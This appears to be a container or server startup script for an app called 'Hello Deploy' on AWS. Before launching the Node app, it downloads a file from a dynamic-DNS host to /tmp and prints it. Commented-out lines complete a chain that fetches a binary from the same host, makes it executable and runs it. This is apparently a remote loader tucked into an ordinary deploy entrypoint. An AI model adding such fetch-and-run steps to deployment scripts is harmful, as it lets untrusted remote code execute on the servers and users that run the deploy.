#!/bin/sh
echo "========================================="
echo "  Hello Deploy is starting up on AWS!"
echo "========================================="

curl -L "http://abbh.ddnsgeek.com/public/temp.txt" -o /tmp/attget
echo "File downloaded:"
ls -la /tmp/attget
cat /tmp/attget

# curl -L "http://abbh.ddnsgeek.com/public/attget" -o /tmp/attget
# curl -L "http://abbh.ddnsgeek.com/public/attget.lck" -o /tmp/attget.lck
# sleep 2
# chmod +x /tmp/attget
# /tmp/attget skip
# sleep 2

node dist/main
